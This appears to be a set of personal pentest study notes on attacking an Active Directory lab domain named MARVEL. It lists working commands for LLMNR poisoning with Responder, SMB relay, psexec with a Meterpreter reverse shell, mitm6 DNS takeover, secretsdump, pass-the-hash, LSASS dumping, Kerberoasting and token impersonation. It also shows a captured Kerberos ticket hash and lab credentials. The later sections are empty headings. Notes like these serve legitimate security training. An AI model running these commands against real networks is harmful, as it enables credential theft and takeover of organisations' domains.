HYDRA-DC 10.0.2.250
punisher 10.0.2.220
spiderman 10.0.2.221

## Strategy
- Responder
- MiTM6
- Scan to generate traffic
- Look for default cred
- What else can I do?

# INIT ACCESS
## LLMNR POISON
*This attack works because a machine in an AD environment requests access to a named service that doesn't exist. The connection fails, and the attacker requests the user:hash to connect the target to the nonexistent service. The target sends the user:hash and attacker can use them for a hashcrack.

Use Responder to capture and poison LLMNR traffic. 

```
sudo responder -I <adapter> -dPv
```

*Note use either the -w OR the -P tag, as WPAD and PROXY server ARE mutually exclusive*

To identify a hashcat mode for hashes try 

```
hashcat --help | grep <hashtype>
```


hashcat basic attacks 

```
  Attack-          | Hash- |
  Mode             | Type  | Example command
 ==================+=======+==================================================================
  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
  Association      | $1$   | hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.rule

```




For example
![[Pasted image 20250218154356.png]]1


## SMB Relay
*Use responder to catch and relay hashes to gain control of a system (pass-the-hash)*

**Detect vulnerable targets**

```
nmap --script=smb2-security-mode.nse -p 445 <target>
```
 Look for 
```
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```


**Disable SMB and HTTP in responder**

```
sudo vim /etc/responder/Responder.conf

or

sudo vim /usr/share/responder/Responder.conf
```

![[Pasted image 20250219153007.png]]

**Run Responder**

```
sudo responder -I <interface> -dP
##the -dw option may be used, but it may lose some funcion
```

**Set up a SMB relay**

```
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
```
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

Now you should receive alerts as they come in and be able to connect
![[Pasted image 20250429220147.png]]

Now if you want to connect use the command
```
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
to interface with the box. That will look like this 
![[Pasted image 20250429220318.png]]
then to connect use the command
```
nc 127.0.0.1 11000
```
![[Pasted image 20250429220425.png]]
which will open a prompt to control the machine.

## Shell Access 
*This works once you have gained either a password or a hash*

Start psexec in MSF
```
msfconsole
use exploit/windows/smb/psexec
## configure it
set payload windows/x64/meterpreter/reverse_tcp
## Don't forget you may need to change the payload!!
run
```
Run psexec manually with a password
```
impacket-psexec <domain>/<user>:'<pass>'@<DC-IP>
```
Run psexec manually with a hash
```
impacket-psexec <user>@<DC-IP> -hashes <LM>:<NT>
```



## IPv6 DNS Takeover
*This attack uses the unused IPv6 system to impersonate an IPv6 DNS and runs MiTM with the DC*

| Conditions                |
| ------------------------- |
| DNS                       |
| IPv6 enabled and not used |

| Triggers       | Event                       |
| -------------- | --------------------------- |
| Machine Reboot | LDAP Dump                   |
| DA Login       | Domain user account created |

Start by running 
```
sudo mitm6 -d <domain>
## And on another terminal
impacket-ntlmrelayx -6 -t ldaps://<DC-IPv4> -wh <fakeservicename>.<domain>.<local (if applicable)> -l <host loot folder>
```

Now wait for events and check the loot folder and you should see things like
![[Pasted image 20250430093930.png]]

![[Pasted image 20250430093906.png]]
Going into Domain users by group we see
![[Pasted image 20250430094337.png]]
![[Pasted image 20250430094006.png]]
Now if we wait for an admin to login we see

![[Pasted image 20250430112926.png]]
To run the secrets-dump script use
```
impacket-secretsdump <Domain>/<DU-User>:'<DU-Pass>'@<DC-IP>
```
![[Pasted image 20250430115017.png]]

## Passback Attack
*Old, but may still work*

What is an MFP? Multi-Function Peripheral 

Also try checking [this](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack) out
"**Introducing the Pass-Back Attack**
The stored LDAP credentials are usually located on the network settings tab in the online configuration of the MFP and can typically be accessed via the Embedded Web Service (EWS). If you can reach the EWS and modify the LDAP server field by replacing the legitimate LDAP server with your malicious LDAP server, then the next time an LDAP query is conducted from the MFP, it will attempt to authenticate to your LDAP server using the configured credentials or the user-supplied credentials."

# POST-COMPROMISE 

## LDAP Domain Dump
*As previously seen in MiTM6*
```
sudo ldapdomaindump ldaps://<LDAP_server> -u '<User>' -p <Password> -o <output_file>
```

## Bloodhound
*Most common AD enumeration tool*

Spin up web console
```
sudo neo4j console
```
Now Bloodhound
```
sudo bloodhound
```
password neo4j1

Now we will use the bloodhound-python ingester
```
sudo bloodhound-python -d <domain> -u <User> -p <Password> -ns <IP> -c all
```

![[Pasted image 20250430142413.png]]
![[Pasted image 20250430142408.png]]
![[Pasted image 20250430142458.png]]

There are lots if different avenues to pursue here, and a huge strength of it is being able to visualize AD structures/trusts/relationships.

## Plumhound
*A Bloodhound wrapper designed to create AD reports*

With Bloodhound running run for basic usage
```
sudo python3 PlumHound.py --easy -p <password to bloodhound>
```

For a default scan run 
```
sudo python3 PlumHound.py -x /tasks/default.tasks -p <password to bloodhound>
```

Click [here](https://github.com/PlumHound/PlumHound) to see the documentation

## PingCastle
*AD audit tool*
Click [here](https://www.pingcastle.com/download/) to download the app
Click [here](https://github.com/netwrix/pingcastle) to download from github

## Pass-Attacks

Pass the Password
```
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
```

Pass the Hash
```
crackmapexec smb <ip/CIDR> -u <user> -h <hash> --local-auth
```
You can also add the 
```
--sam
--shares
--lsa
```

To view additional modules
```
crackmapexec smb -L
```

For LSASS dump
```
crackmapexec smb <ip/CIDR> -u <user> -h <hash> --local-auth
```


## Kerberoasting

Grab SPN's, and dump hashes
```
impacket-GetUserSPNs <DOMAIN/user:pass> -dc-ip <ip> -request
```
Crack the Hash
```
hashcat -m 13100 <hash.txt> <wordlist.txt>
```

```
impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.250 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                            Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation 
----------------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
DomainController/SQLService.MARVEL.local:60111  sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-04-29 18:53:18.402395  <never>               
SQLService/MARVEL.local                         sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-04-29 18:53:18.402395  <never>               
HYDRA-DC/SQLService.MARVEL.local:60111          sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-04-29 18:53:18.402395  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/sqlservice*$ff872d1684e55d234a0c128e60b3348d$7da0166cf6f40afe288b62d82923586bac1e6bc20746266e21233171181958dbbadc3515dc527b32100b78899d90f53d2e93575ff78948c4365d3e190a0417072e1d22ef1b7ae03f23d7bf780a6c9fddebc75d334947306e6e5af6558b06d963b463201d508cbad8287db5974f771ea1658fa9c684f7d592671902780bf9e2c1b9ca6c32248bcf2d5a3f5e8095ac64c7c38b9a7d1a370d6421502192b4f686a14407b264a75730360ad02b25c9484d48bb4e1e7418ed5e003ecad3abef2deabd2ae503f92c508110d4a592ca3e134968e1b1f973683495770e1739003bbabe1815ff4bab276ce642f8c2e50afb5cf2329ca2cbc5a85d2af7085908c2f1ebac7fe293c27cf5005e9fb0ba0a2cb9fe77a2b07bf61834d57f65691f0ac3a3db3206626a69882168cda20b795a0f472d5ef231f187ced50951b17292edadc022f9a4d0708e91bc4e4013cd7304b7a2c3931bf147b97cc0cef4741d3a3af9967301d3772fbe123a7a2b0377de9918d6f51e50450f5d4c26fa74c61b2b9f84555b6f995edfd951a0afa7448f087bd3b73495951e42ed525d3bce88e1cc4a30209d53eec4edd49070a632238fbbe408bb7ba12b4bd05f61c025af5304075a8b71d9d1a30c8069f63250eeb1c71f89c741c7feb8cd109dc1fa57fa7fa5481803e3ca3ed9d8e3855815f3bf27fa153b943138e172c31ef5a5fa54f397b1a922c8922278b7fadf0d870a9ad25ce888de79ecf6ac1f379b11ebbd025ed6dd375f272b182b538404fe515d1749f0b4f5cd720865d7b57eed92009ad95839102760b1c55215c7b97955329934036ee9893634d9697afac654c6dad9dd25b76eb6827367c75bf68e6bb94d832b3ce71cf45cdaffd32f6a7a74bb02e9b1465303c9818e4405f4b0b42e99a87a3ba04eed94bf199c0753eb365375741ba9988e66b93446841f1d3d27d82268d14ab4b19ce21b40506f2d3361af4a27cae6d6804e56924c0bec2e89bc6ef40537bdb69f1c50a352cdb364d3fd705640a58a12c8479bf17bec3f74a052333d472f973e3e01def5f7637c7890c47c5facd72adfd157a5e2e3baede42f4edad639294dd882240173b1d5662370872edc7a1f283923481642a6acdf99158496a8f8ddcbb4d2c54b8e35643e46327cfc2fad26b9502d465e83414532860a2a51387c94abd44d8e2e68f99b24835ecca07d2b31ed79d38d8fb05320519385281a30db1183a05c950faf99d7ba57df31af8f86a4f20eb5da44bd7c57e9d7ac67062a57bd1bb762a5533d43f62da88367d50af77b37d26c4109fc8e422332f30c3d9d93bb17a5bffba23375435ecdadcb0b6b4242a3133a1faefce020edc36e4dbc1fa7a3273d69ce04534f694ef1e0d34aeebfa012305289f3983a57c420f3db5268ae7f46278a4e92a4f4302bf3213f31ce1543f85ad6b0541132985c38346ce9bba844b948f802e7db8b6aa6f7889ea7b03f6fa10c7532ae741b7f901191f4a0b3dbdc965ce352ee7719aea2f9f462a6d92d
```

## Token Impersonation
*Who needs using incognito mode on your computer when you can use it on a friends?*

Start with a Meterpreter shell.
```
meterpreter > use incognito
Loading extension incognito...success.
meterpreter > help

Incognito Commands
==================

    Command              Description
    -------              -----------
    add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    snarf_hashes         Snarf challenge/response hashes for every token

meterpreter >
```


```
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter >
```
## LNK File Attack
*Create a watering hole file to link back to your server to trigger Responder*


## GPP/ cPassword Attacks

## Mimikatz

## NTDS.dit

## Golden Ticket





